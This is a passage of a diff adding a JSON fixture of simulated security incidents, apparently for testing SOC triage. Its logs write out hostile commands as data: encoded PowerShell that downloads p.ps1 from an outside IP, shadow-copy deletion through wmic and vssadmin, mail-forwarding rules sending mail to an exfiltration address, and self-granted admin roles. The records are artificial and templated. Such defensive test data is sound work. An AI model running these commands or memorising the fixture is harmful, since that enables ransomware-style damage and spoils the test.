+      "timestamp=2026-05-13T10:33:36.000Z event_type=process asset=WS-FIN-014 process_name=powershell.exe command_line=\"Invoke-WebRequest http://185.220.101.47/p.ps1\" user=unknown.user parent_process=powershell.exe",
+      "timestamp=2026-05-13T10:33:48.000Z event_type=process asset=WS-FIN-014 process_name=svchost.exe command_line=C:\\Users\\Public\\svchost.exe user=unknown.user parent_process=powershell.exe",
+      "timestamp=2026-05-13T10:34:00.000Z event_type=process asset=WS-FIN-014 process_name=nmap.exe command_line=\"nmap -sS -p 22,80,135,139,389,443,445 10.0.2.0/24\" user=unknown.user parent_process=svchost.exe",
+      "timestamp=2026-05-13T10:34:12.000Z event_type=process asset=WS-FIN-014 process_name=wmic.exe command_line=\"wmic /node:FILE-SRV-001 process call create \"cmd.exe /c vssadmin delete shadows\"\" user=unknown.user parent_process=nmap.exe",
+      "timestamp=2026-05-13T10:34:24.000Z event_type=process asset=WS-FIN-014 process_name=vssadmin.exe command_line=\"vssadmin delete shadows /all /quiet\" user=unknown.user parent_process=wmic.exe",
+      "timestamp=2026-05-13T10:34:36.000Z event_type=process asset=WS-FIN-014 process_name=whoami.exe command_line=\"whoami /all\" user=unknown.user parent_process=vssadmin.exe",
+      "timestamp=2026-05-13T10:34:48.000Z event_type=process asset=WS-FIN-014 process_name=net.exe command_line=\"net group \"Domain Admins\" /domain\" user=unknown.user parent_process=whoami.exe",
+      "timestamp=2026-05-13T10:35:00.000Z event_type=network asset=WS-FIN-014 source_ip=10.4.5.114 destination_ip=185.220.101.47 destination_port=443 action=ALLOWED bytes=12482 process=svchost.exe"
+    ],
+    "asset": {
+      "hostname": "WS-FIN-014",
+      "ip": "10.4.5.114",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T10:33:30Z",
+      "riskScore": "high",
+      "openVulnerabilities": 24
+    }
+  },
+  "INC-2026-0513": {
+    "logs": [
+      "timestamp=2026-05-13T10:51:30.000Z event_type=process asset=WS-FIN-014 process_name=OUTLOOK.EXE command_line=\"outlook /attach Invoice-Q2.docm\" user=unknown.user parent_process=explorer.exe",
+      "timestamp=2026-05-13T10:51:42.000Z event_type=process asset=WS-FIN-014 process_name=WINWORD.EXE command_line=\"WINWORD.EXE Invoice-Q2.docm\" user=unknown.user parent_process=OUTLOOK.EXE",
+      "timestamp=2026-05-13T10:51:54.000Z event_type=process asset=WS-FIN-014 process_name=powershell.exe command_line=\"powershell.exe -nop -w hidden -enc SUVYIChOZXctT2JqZ...\" user=unknown.user parent_process=WINWORD.EXE",
+      "timestamp=2026-05-13T10:52:06.000Z event_type=process asset=WS-FIN-014 process_name=powershell.exe command_line=\"Invoke-WebRequest http://185.220.101.47/p.ps1\" user=unknown.user parent_process=powershell.exe",
+      "timestamp=2026-05-13T10:52:18.000Z event_type=process asset=WS-FIN-014 process_name=svchost.exe command_line=C:\\Users\\Public\\svchost.exe user=unknown.user parent_process=powershell.exe",
+      "timestamp=2026-05-13T10:52:30.000Z event_type=process asset=WS-FIN-014 process_name=nmap.exe command_line=\"nmap -sS -p 22,80,135,139,389,443,445 10.0.2.0/24\" user=unknown.user parent_process=svchost.exe",
+      "timestamp=2026-05-13T10:52:42.000Z event_type=process asset=WS-FIN-014 process_name=wmic.exe command_line=\"wmic /node:FILE-SRV-001 process call create \"cmd.exe /c vssadmin delete shadows\"\" user=unknown.user parent_process=nmap.exe",
+      "timestamp=2026-05-13T10:52:54.000Z event_type=process asset=WS-FIN-014 process_name=vssadmin.exe command_line=\"vssadmin delete shadows /all /quiet\" user=unknown.user parent_process=wmic.exe",
+      "timestamp=2026-05-13T10:53:06.000Z event_type=process asset=WS-FIN-014 process_name=whoami.exe command_line=\"whoami /all\" user=unknown.user parent_process=vssadmin.exe",
+      "timestamp=2026-05-13T10:53:18.000Z event_type=process asset=WS-FIN-014 process_name=net.exe command_line=\"net group \"Domain Admins\" /domain\" user=unknown.user parent_process=whoami.exe",
+      "timestamp=2026-05-13T10:53:30.000Z event_type=network asset=WS-FIN-014 source_ip=10.4.5.114 destination_ip=185.220.101.47 destination_port=443 action=ALLOWED bytes=12482 process=svchost.exe"
+    ],
+    "asset": {
+      "hostname": "WS-FIN-014",
+      "ip": "10.4.5.114",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T10:52:00Z",
+      "riskScore": "high",
+      "openVulnerabilities": 24
+    }
+  },
+  "INC-2026-0514": {
+    "logs": [
+      "timestamp=2026-05-13T10:42:30.000Z event_type=process asset=WS-FIN-014 process_name=OUTLOOK.EXE command_line=\"outlook /attach Invoice-Q2.docm\" user=unknown.user parent_process=explorer.exe",
+      "timestamp=2026-05-13T10:42:42.000Z event_type=process asset=WS-FIN-014 process_name=WINWORD.EXE command_line=\"WINWORD.EXE Invoice-Q2.docm\" user=unknown.user parent_process=OUTLOOK.EXE",
+      "timestamp=2026-05-13T10:42:54.000Z event_type=process asset=WS-FIN-014 process_name=powershell.exe command_line=\"powershell.exe -nop -w hidden -enc SUVYIChOZXctT2JqZ...\" user=unknown.user parent_process=WINWORD.EXE",
+      "timestamp=2026-05-13T10:43:06.000Z event_type=process asset=WS-FIN-014 process_name=powershell.exe command_line=\"Invoke-WebRequest http://185.220.101.47/p.ps1\" user=unknown.user parent_process=powershell.exe",
+      "timestamp=2026-05-13T10:43:18.000Z event_type=process asset=WS-FIN-014 process_name=svchost.exe command_line=C:\\Users\\Public\\svchost.exe user=unknown.user parent_process=powershell.exe",
+      "timestamp=2026-05-13T10:43:30.000Z event_type=process asset=WS-FIN-014 process_name=nmap.exe command_line=\"nmap -sS -p 22,80,135,139,389,443,445 10.0.2.0/24\" user=unknown.user parent_process=svchost.exe",
+      "timestamp=2026-05-13T10:43:42.000Z event_type=process asset=WS-FIN-014 process_name=wmic.exe command_line=\"wmic /node:FILE-SRV-001 process call create \"cmd.exe /c vssadmin delete shadows\"\" user=unknown.user parent_process=nmap.exe",
+      "timestamp=2026-05-13T10:43:54.000Z event_type=process asset=WS-FIN-014 process_name=vssadmin.exe command_line=\"vssadmin delete shadows /all /quiet\" user=unknown.user parent_process=wmic.exe",
+      "timestamp=2026-05-13T10:44:06.000Z event_type=process asset=WS-FIN-014 process_name=whoami.exe command_line=\"whoami /all\" user=unknown.user parent_process=vssadmin.exe",
+      "timestamp=2026-05-13T10:44:18.000Z event_type=process asset=WS-FIN-014 process_name=net.exe command_line=\"net group \"Domain Admins\" /domain\" user=unknown.user parent_process=whoami.exe",
+      "timestamp=2026-05-13T10:44:30.000Z event_type=network asset=WS-FIN-014 source_ip=10.4.5.114 destination_ip=185.220.101.47 destination_port=443 action=ALLOWED bytes=12482 process=svchost.exe"
+    ],
+    "asset": {
+      "hostname": "WS-FIN-014",
+      "ip": "10.4.5.114",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T10:43:00Z",
+      "riskScore": "high",
+      "openVulnerabilities": 24
+    }
+  },
+  "INC-2026-0515": {
+    "logs": [
+      "timestamp=2026-05-12T16:32:30.000Z event_type=process asset=WS-IT-002 process_name=OUTLOOK.EXE command_line=\"outlook /attach Invoice-Q2.docm\" user=soc.analyst parent_process=explorer.exe",
+      "timestamp=2026-05-12T16:32:42.000Z event_type=process asset=WS-IT-002 process_name=WINWORD.EXE command_line=\"WINWORD.EXE Invoice-Q2.docm\" user=soc.analyst parent_process=OUTLOOK.EXE",
+      "timestamp=2026-05-12T16:32:54.000Z event_type=process asset=WS-IT-002 process_name=powershell.exe command_line=\"powershell.exe -nop -w hidden -enc SUVYIChOZXctT2JqZ...\" user=soc.analyst parent_process=WINWORD.EXE",
+      "timestamp=2026-05-12T16:33:06.000Z event_type=process asset=WS-IT-002 process_name=powershell.exe command_line=\"Invoke-WebRequest http://185.220.101.47/p.ps1\" user=soc.analyst parent_process=powershell.exe",
+      "timestamp=2026-05-12T16:33:18.000Z event_type=process asset=WS-IT-002 process_name=svchost.exe command_line=C:\\Users\\Public\\svchost.exe user=soc.analyst parent_process=powershell.exe",
+      "timestamp=2026-05-12T16:33:30.000Z event_type=process asset=WS-IT-002 process_name=nmap.exe command_line=\"nmap -sS -p 22,80,135,139,389,443,445 10.0.2.0/24\" user=soc.analyst parent_process=svchost.exe",
+      "timestamp=2026-05-12T16:33:42.000Z event_type=process asset=WS-IT-002 process_name=wmic.exe command_line=\"wmic /node:FILE-SRV-001 process call create \"cmd.exe /c vssadmin delete shadows\"\" user=soc.analyst parent_process=nmap.exe",
+      "timestamp=2026-05-12T16:33:54.000Z event_type=process asset=WS-IT-002 process_name=vssadmin.exe command_line=\"vssadmin delete shadows /all /quiet\" user=soc.analyst parent_process=wmic.exe",
+      "timestamp=2026-05-12T16:34:06.000Z event_type=process asset=WS-IT-002 process_name=whoami.exe command_line=\"whoami /all\" user=soc.analyst parent_process=vssadmin.exe",
+      "timestamp=2026-05-12T16:34:18.000Z event_type=process asset=WS-IT-002 process_name=net.exe command_line=\"net group \"Domain Admins\" /domain\" user=soc.analyst parent_process=whoami.exe",
+      "timestamp=2026-05-12T16:34:30.000Z event_type=network asset=WS-IT-002 source_ip=10.4.5.114 destination_ip=185.220.101.47 destination_port=443 action=ALLOWED bytes=12482 process=svchost.exe"
+    ],
+    "asset": {
+      "hostname": "WS-IT-002",
+      "ip": "10.4.5.114",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-12T16:33:00Z",
+      "riskScore": "medium",
+      "openVulnerabilities": 7
+    }
+  },
+  "INC-2026-0516": {
+    "logs": [
+      "timestamp=2026-05-13T09:55:30.000Z event_type=mailbox_access mailbox=ap@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false items_accessed=142",
+      "timestamp=2026-05-13T09:56:02.000Z event_type=mailbox_access mailbox=ar@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false items_accessed=143",
+      "timestamp=2026-05-13T09:56:34.000Z event_type=mailbox_access mailbox=payroll@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false items_accessed=144",
+      "timestamp=2026-05-13T09:57:06.000Z event_type=mailbox_access mailbox=controller@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false items_accessed=145",
+      "timestamp=2026-05-13T09:57:38.000Z event_type=mailbox_access mailbox=ap@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false items_accessed=146",
+      "timestamp=2026-05-13T09:58:10.000Z event_type=mailbox_access mailbox=ar@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false items_accessed=147",
+      "timestamp=2026-05-13T09:58:42.000Z event_type=inbox_rule_created mailbox=payroll@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false forward_to=exfil-drop@protonmail.com",
+      "timestamp=2026-05-13T09:59:14.000Z event_type=inbox_rule_created mailbox=controller@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false forward_to=exfil-drop@protonmail.com",
+      "timestamp=2026-05-13T09:59:46.000Z event_type=inbox_rule_created mailbox=ap@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false forward_to=exfil-drop@protonmail.com",
+      "timestamp=2026-05-13T10:00:18.000Z event_type=oauth_token_issued mailbox=ar@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false",
+      "timestamp=2026-05-13T10:00:50.000Z event_type=oauth_token_issued mailbox=payroll@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false",
+      "timestamp=2026-05-13T10:01:22.000Z event_type=oauth_token_issued mailbox=controller@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false"
+    ],
+    "asset": {
+      "hostname": "UNKNOWN-HOST",
+      "ip": "10.4.5.114",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T09:55:30Z",
+      "riskScore": "high",
+      "openVulnerabilities": 24
+    }
+  },
+  "INC-2026-0517": {
+    "logs": [
+      "timestamp=2026-05-13T10:51:30.000Z event_type=process asset=UNKNOWN-HOST process_name=OUTLOOK.EXE command_line=\"outlook /attach Invoice-Q2.docm\" user=j.harrington@contoso.com parent_process=explorer.exe",
+      "timestamp=2026-05-13T10:51:42.000Z event_type=process asset=UNKNOWN-HOST process_name=WINWORD.EXE command_line=\"WINWORD.EXE Invoice-Q2.docm\" user=j.harrington@contoso.com parent_process=OUTLOOK.EXE",
+      "timestamp=2026-05-13T10:51:54.000Z event_type=process asset=UNKNOWN-HOST process_name=powershell.exe command_line=\"powershell.exe -nop -w hidden -enc SUVYIChOZXctT2JqZ...\" user=j.harrington@contoso.com parent_process=WINWORD.EXE",
+      "timestamp=2026-05-13T10:52:06.000Z event_type=process asset=UNKNOWN-HOST process_name=powershell.exe command_line=\"Invoke-WebRequest http://185.220.101.47/p.ps1\" user=j.harrington@contoso.com parent_process=powershell.exe",
+      "timestamp=2026-05-13T10:52:18.000Z event_type=process asset=UNKNOWN-HOST process_name=svchost.exe command_line=C:\\Users\\Public\\svchost.exe user=j.harrington@contoso.com parent_process=powershell.exe",
+      "timestamp=2026-05-13T10:52:30.000Z event_type=process asset=UNKNOWN-HOST process_name=nmap.exe command_line=\"nmap -sS -p 22,80,135,139,389,443,445 10.0.2.0/24\" user=j.harrington@contoso.com parent_process=svchost.exe",
+      "timestamp=2026-05-13T10:52:42.000Z event_type=process asset=UNKNOWN-HOST process_name=wmic.exe command_line=\"wmic /node:FILE-SRV-001 process call create \"cmd.exe /c vssadmin delete shadows\"\" user=j.harrington@contoso.com parent_process=nmap.exe",
+      "timestamp=2026-05-13T10:52:54.000Z event_type=process asset=UNKNOWN-HOST process_name=vssadmin.exe command_line=\"vssadmin delete shadows /all /quiet\" user=j.harrington@contoso.com parent_process=wmic.exe",
+      "timestamp=2026-05-13T10:53:06.000Z event_type=process asset=UNKNOWN-HOST process_name=whoami.exe command_line=\"whoami /all\" user=j.harrington@contoso.com parent_process=vssadmin.exe",
+      "timestamp=2026-05-13T10:53:18.000Z event_type=process asset=UNKNOWN-HOST process_name=net.exe command_line=\"net group \"Domain Admins\" /domain\" user=j.harrington@contoso.com parent_process=whoami.exe",
+      "timestamp=2026-05-13T10:53:30.000Z event_type=network asset=UNKNOWN-HOST source_ip=10.4.5.114 destination_ip=185.220.101.47 destination_port=443 action=ALLOWED bytes=12482 process=svchost.exe"
+    ],
+    "asset": {
+      "hostname": "UNKNOWN-HOST",
+      "ip": "10.4.5.114",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T10:52:00Z",
+      "riskScore": "high",
+      "openVulnerabilities": 24
+    }
+  },
+  "INC-2026-0518": {
+    "logs": [
+      "timestamp=2026-05-13T08:56:00.000Z event_type=mailbox_access mailbox=ap@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false items_accessed=142",
+      "timestamp=2026-05-13T08:56:32.000Z event_type=mailbox_access mailbox=ar@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false items_accessed=143",
+      "timestamp=2026-05-13T08:57:04.000Z event_type=mailbox_access mailbox=payroll@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false items_accessed=144",
+      "timestamp=2026-05-13T08:57:36.000Z event_type=mailbox_access mailbox=controller@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false items_accessed=145",
+      "timestamp=2026-05-13T08:58:08.000Z event_type=mailbox_access mailbox=ap@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false items_accessed=146",
+      "timestamp=2026-05-13T08:58:40.000Z event_type=mailbox_access mailbox=ar@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false items_accessed=147",
+      "timestamp=2026-05-13T08:59:12.000Z event_type=inbox_rule_created mailbox=payroll@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false forward_to=exfil-drop@protonmail.com",
+      "timestamp=2026-05-13T08:59:44.000Z event_type=inbox_rule_created mailbox=controller@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false forward_to=exfil-drop@protonmail.com",
+      "timestamp=2026-05-13T09:00:16.000Z event_type=inbox_rule_created mailbox=ap@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false forward_to=exfil-drop@protonmail.com",
+      "timestamp=2026-05-13T09:00:48.000Z event_type=oauth_token_issued mailbox=ar@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false",
+      "timestamp=2026-05-13T09:01:20.000Z event_type=oauth_token_issued mailbox=payroll@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false",
+      "timestamp=2026-05-13T09:01:52.000Z event_type=oauth_token_issued mailbox=controller@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false"
+    ],
+    "asset": {
+      "hostname": "UNKNOWN-HOST",
+      "ip": "10.4.5.114",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T08:56:00Z",
+      "riskScore": "high",
+      "openVulnerabilities": 24
+    }
+  },
+  "INC-2026-0519": {
+    "logs": [
+      "timestamp=2026-05-13T11:36:50.000Z event_type=firewall source_ip=10.4.5.114 source_host=UNKNOWN-HOST destination_ip=185.220.101.42 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1024 bytes_in=8192",
+      "timestamp=2026-05-13T11:37:10.000Z event_type=firewall source_ip=10.4.5.114 source_host=UNKNOWN-HOST destination_ip=185.220.101.47 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1115 bytes_in=8204",
+      "timestamp=2026-05-13T11:37:30.000Z event_type=firewall source_ip=10.4.5.114 source_host=UNKNOWN-HOST destination_ip=45.83.193.150 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1206 bytes_in=8216",
+      "timestamp=2026-05-13T11:37:50.000Z event_type=firewall source_ip=10.4.5.114 source_host=UNKNOWN-HOST destination_ip=185.220.101.42 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1297 bytes_in=8228",
+      "timestamp=2026-05-13T11:38:10.000Z event_type=firewall source_ip=10.4.5.114 source_host=UNKNOWN-HOST destination_ip=185.220.101.47 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1388 bytes_in=8240",
+      "timestamp=2026-05-13T11:38:30.000Z event_type=firewall source_ip=10.4.5.114 source_host=UNKNOWN-HOST destination_ip=45.83.193.150 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1479 bytes_in=8252",
+      "timestamp=2026-05-13T11:38:50.000Z event_type=firewall source_ip=10.4.5.114 source_host=UNKNOWN-HOST destination_ip=185.220.101.42 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1570 bytes_in=8264",
+      "timestamp=2026-05-13T11:39:10.000Z event_type=firewall source_ip=10.4.5.114 source_host=UNKNOWN-HOST destination_ip=185.220.101.47 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1661 bytes_in=8276",
+      "timestamp=2026-05-13T11:39:30.000Z event_type=firewall source_ip=10.4.5.114 source_host=UNKNOWN-HOST destination_ip=45.83.193.150 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1752 bytes_in=8288",
+      "timestamp=2026-05-13T11:39:50.000Z event_type=firewall source_ip=10.4.5.114 source_host=UNKNOWN-HOST destination_ip=185.220.101.42 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1843 bytes_in=8300",
+      "timestamp=2026-05-13T11:40:10.000Z event_type=firewall source_ip=10.4.5.114 source_host=UNKNOWN-HOST destination_ip=185.220.101.47 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1934 bytes_in=8312",
+      "timestamp=2026-05-13T11:40:30.000Z event_type=firewall source_ip=10.4.5.114 source_host=UNKNOWN-HOST destination_ip=45.83.193.150 destination_port=53 protocol=TCP action=ALLOWED bytes_out=2025 bytes_in=8324",
+      "timestamp=2026-05-13T11:40:50.000Z event_type=firewall source_ip=10.4.5.114 source_host=UNKNOWN-HOST destination_ip=185.220.101.42 destination_port=443 protocol=TCP action=ALLOWED bytes_out=2116 bytes_in=8336",
+      "timestamp=2026-05-13T11:41:10.000Z event_type=firewall source_ip=10.4.5.114 source_host=UNKNOWN-HOST destination_ip=185.220.101.47 destination_port=53 protocol=TCP action=BLOCKED bytes_out=2207 bytes_in=8348"
+    ],
+    "asset": {
+      "hostname": "UNKNOWN-HOST",
+      "ip": "10.4.5.114",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T11:38:30Z",
+      "riskScore": "medium",
+      "openVulnerabilities": 7
+    }
+  },
+  "INC-2026-0520": {
+    "logs": [
+      "timestamp=2026-05-13T11:16:00Z event_type=role_assignment assigning_user=temp.admin@contoso.com assigned_user=temp.admin@contoso.com role=\"Global Administrator\" source_ip=10.4.5.114 tor_exit_node=true change_ticket=NONE",
+      "timestamp=2026-05-13T11:16:30.000Z event_type=cloud_action user=temp.admin@contoso.com operation=AppRegistrationCreated source_ip=10.4.5.114 result=Success",
+      "timestamp=2026-05-13T11:16:48.000Z event_type=cloud_action user=temp.admin@contoso.com operation=ConditionalAccessPolicy.Disable source_ip=10.4.5.114 result=Success",
+      "timestamp=2026-05-13T11:17:06.000Z event_type=cloud_action user=temp.admin@contoso.com operation=KeyVault.Secret.Read source_ip=10.4.5.114 result=Success",
+      "timestamp=2026-05-13T11:17:24.000Z event_type=cloud_action user=temp.admin@contoso.com operation=RoleEligibility.Add source_ip=10.4.5.114 result=Success",
+      "timestamp=2026-05-13T11:17:42.000Z event_type=cloud_action user=temp.admin@contoso.com operation=DirectoryAudit.Read source_ip=10.4.5.114 result=Success",
+      "timestamp=2026-05-13T11:18:00.000Z event_type=cloud_action user=temp.admin@contoso.com operation=MailItemsAccessed source_ip=10.4.5.114 result=Success",
+      "timestamp=2026-05-13T11:18:18.000Z event_type=cloud_action user=temp.admin@contoso.com operation=AppRegistrationCreated source_ip=10.4.5.114 result=Success",
+      "timestamp=2026-05-13T11:18:36.000Z event_type=cloud_action user=temp.admin@contoso.com operation=ConditionalAccessPolicy.Disable source_ip=10.4.5.114 result=Success",
+      "timestamp=2026-05-13T11:18:54.000Z event_type=cloud_action user=temp.admin@contoso.com operation=KeyVault.Secret.Read source_ip=10.4.5.114 result=Success"
+    ],
+    "asset": {
+      "hostname": "UNKNOWN-HOST",
+      "ip": "10.4.5.114",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T11:16:00Z",
+      "riskScore": "high",
+      "openVulnerabilities": 24
+    }
+  },
+  "INC-2026-0521": {
+    "logs": [
+      "timestamp=2026-05-13T05:59:20.000Z event_type=firewall source_ip=10.4.5.114 source_host=stgprodbackups01 destination_ip=185.220.101.42 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1024 bytes_in=8192",
+      "timestamp=2026-05-13T05:59:40.000Z event_type=firewall source_ip=10.4.5.114 source_host=stgprodbackups01 destination_ip=185.220.101.47 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1115 bytes_in=8204",
+      "timestamp=2026-05-13T06:00:00.000Z event_type=firewall source_ip=10.4.5.114 source_host=stgprodbackups01 destination_ip=45.83.193.150 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1206 bytes_in=8216",
+      "timestamp=2026-05-13T06:00:20.000Z event_type=firewall source_ip=10.4.5.114 source_host=stgprodbackups01 destination_ip=185.220.101.42 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1297 bytes_in=8228",
+      "timestamp=2026-05-13T06:00:40.000Z event_type=firewall source_ip=10.4.5.114 source_host=stgprodbackups01 destination_ip=185.220.101.47 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1388 bytes_in=8240",
+      "timestamp=2026-05-13T06:01:00.000Z event_type=firewall source_ip=10.4.5.114 source_host=stgprodbackups01 destination_ip=45.83.193.150 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1479 bytes_in=8252",
+      "timestamp=2026-05-13T06:01:20.000Z event_type=firewall source_ip=10.4.5.114 source_host=stgprodbackups01 destination_ip=185.220.101.42 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1570 bytes_in=8264",
+      "timestamp=2026-05-13T06:01:40.000Z event_type=firewall source_ip=10.4.5.114 source_host=stgprodbackups01 destination_ip=185.220.101.47 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1661 bytes_in=8276",
+      "timestamp=2026-05-13T06:02:00.000Z event_type=firewall source_ip=10.4.5.114 source_host=stgprodbackups01 destination_ip=45.83.193.150 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1752 bytes_in=8288",
+      "timestamp=2026-05-13T06:02:20.000Z event_type=firewall source_ip=10.4.5.114 source_host=stgprodbackups01 destination_ip=185.220.101.42 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1843 bytes_in=8300",
+      "timestamp=2026-05-13T06:02:40.000Z event_type=firewall source_ip=10.4.5.114 source_host=stgprodbackups01 destination_ip=185.220.101.47 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1934 bytes_in=8312",
+      "timestamp=2026-05-13T06:03:00.000Z event_type=firewall source_ip=10.4.5.114 source_host=stgprodbackups01 destination_ip=45.83.193.150 destination_port=53 protocol=TCP action=ALLOWED bytes_out=2025 bytes_in=8324",
+      "timestamp=2026-05-13T06:03:20.000Z event_type=firewall source_ip=10.4.5.114 source_host=stgprodbackups01 destination_ip=185.220.101.42 destination_port=443 protocol=TCP action=ALLOWED bytes_out=2116 bytes_in=8336",
+      "timestamp=2026-05-13T06:03:40.000Z event_type=firewall source_ip=10.4.5.114 source_host=stgprodbackups01 destination_ip=185.220.101.47 destination_port=53 protocol=TCP action=BLOCKED bytes_out=2207 bytes_in=8348"
+    ],
+    "asset": {
+      "hostname": "stgprodbackups01",
+      "ip": "10.4.5.114",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T06:01:00Z",
+      "riskScore": "high",
+      "openVulnerabilities": 24
+    }
+  },
+  "INC-2026-0522": {
+    "logs": [
+      "timestamp=2026-05-13T11:01:50.000Z event_type=auth source_ip=10.4.5.114 destination_user=unknown.user app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T11:02:01.000Z event_type=auth source_ip=10.4.5.114 destination_user=user1@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T11:02:12.000Z event_type=auth source_ip=10.4.5.114 destination_user=user2@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T11:02:23.000Z event_type=auth source_ip=10.4.5.114 destination_user=unknown.user app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T11:02:34.000Z event_type=auth source_ip=10.4.5.114 destination_user=user4@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T11:02:45.000Z event_type=auth source_ip=10.4.5.114 destination_user=user5@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T11:02:56.000Z event_type=auth source_ip=10.4.5.114 destination_user=unknown.user app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T11:03:07.000Z event_type=auth source_ip=10.4.5.114 destination_user=user7@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T11:03:18.000Z event_type=auth source_ip=10.4.5.114 destination_user=user8@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T11:03:29.000Z event_type=auth source_ip=10.4.5.114 destination_user=unknown.user app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T11:03:40.000Z event_type=auth source_ip=10.4.5.114 destination_user=user10@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T11:03:51.000Z event_type=auth source_ip=10.4.5.114 destination_user=user11@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T11:04:02.000Z event_type=auth source_ip=10.4.5.114 destination_user=unknown.user app=\"Microsoft 365\" result=SUCCESS",
+      "timestamp=2026-05-13T11:04:13.000Z event_type=auth source_ip=10.4.5.114 destination_user=user13@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password"
+    ],
+    "asset": {
+      "hostname": "vm-jumpbox-01",
+      "ip": "10.4.5.114",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T11:03:00Z",
+      "riskScore": "medium",
+      "openVulnerabilities": 7
+    }
+  },
+  "INC-2026-0523": {
+    "logs": [
+      "timestamp=2026-05-13T11:23:00Z event_type=role_assignment assigning_user=unknown.user assigned_user=unknown.user role=\"Global Administrator\" source_ip=10.4.5.114 tor_exit_node=true change_ticket=NONE",
+      "timestamp=2026-05-13T11:23:30.000Z event_type=cloud_action user=unknown.user operation=AppRegistrationCreated source_ip=10.4.5.114 result=Success",
+      "timestamp=2026-05-13T11:23:48.000Z event_type=cloud_action user=unknown.user operation=ConditionalAccessPolicy.Disable source_ip=10.4.5.114 result=Success",
+      "timestamp=2026-05-13T11:24:06.000Z event_type=cloud_action user=unknown.user operation=KeyVault.Secret.Read source_ip=10.4.5.114 result=Success",
+      "timestamp=2026-05-13T11:24:24.000Z event_type=cloud_action user=unknown.user operation=RoleEligibility.Add source_ip=10.4.5.114 result=Success",
+      "timestamp=2026-05-13T11:24:42.000Z event_type=cloud_action user=unknown.user operation=DirectoryAudit.Read source_ip=10.4.5.114 result=Success",
+      "timestamp=2026-05-13T11:25:00.000Z event_type=cloud_action user=unknown.user operation=MailItemsAccessed source_ip=10.4.5.114 result=Success",
+      "timestamp=2026-05-13T11:25:18.000Z event_type=cloud_action user=unknown.user operation=AppRegistrationCreated source_ip=10.4.5.114 result=Success",
